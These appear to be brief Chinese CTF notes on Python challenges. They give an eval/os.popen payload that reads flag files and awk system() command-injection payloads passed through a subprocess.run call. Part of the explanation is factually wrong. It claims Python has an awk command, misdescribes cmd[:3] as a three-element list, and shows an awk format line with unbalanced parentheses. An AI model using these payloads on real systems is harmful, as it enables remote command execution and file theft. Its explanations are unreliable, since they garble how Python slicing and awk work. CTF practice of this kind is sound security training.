## **eval()函数读文件**
```
eval(__import__('os').popen('cat /f*').read());
```

^
## **subprocess运行外部命令**
使用了 Python 的 `subprocess` 模块来运行外部命令：
```
tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5)
```
1. `subprocess.run`: 这是 `subprocess` 模块中的一个函数，用于运行外部命令。
2. `cmd[:3]`: 这是一个列表，包含了外部命令的可执行文件和它的参数。`cmd[:3]` 表示取 `cmd` 列表的前三个元素，可能是外部命令的可执行文件和一些参数。
3. `param`: 这是一个变量，作为外部命令的参数。
4. `__file__`: 这是一个变量，表示当前脚本的文件名。
5. `cwd=os.getcwd()`: 这是 `subprocess.run` 函数的参数，指定了子进程的当前工作目录。`os.getcwd()` 返回当前工作目录。
6. `timeout=5`: 这是 `subprocess.run` 函数的参数，指定了运行外部命令的超时时间，单位是秒。在这里，设置为 5 秒。

cmd是执行的命令，param是执行的参数
python中有一个awk命令，可以执行系统命令，长度刚好为3
格式为：awk '(system("ls")' 
通过抓包分析，传参方式为post，根据可控参数cmd和param
通过awk构造payload
payload:
cmd=awk&param={system("ls")}//查看当前路径下所有文件
cmd=awk&param={system("cat fla*")}//查爱fLag文件的内容

